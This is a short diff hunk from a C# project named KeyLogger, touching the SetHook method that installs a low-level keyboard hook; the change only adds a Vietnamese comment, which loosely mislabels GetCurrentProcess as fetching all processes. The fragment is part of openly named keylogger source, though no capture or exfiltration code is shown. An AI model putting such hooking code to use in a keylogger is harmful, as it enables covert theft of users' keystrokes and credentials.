@@ -56,7 +56,7 @@ namespace KeyLogger
         /// <returns></returns>
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
-            using (Process curProcess = Process.GetCurrentProcess())
+            using (Process curProcess = Process.GetCurrentProcess())// lấy tất cả tiến trình hiện tại
             {
                 using (ProcessModule curModule = curProcess.MainModule)
                 {
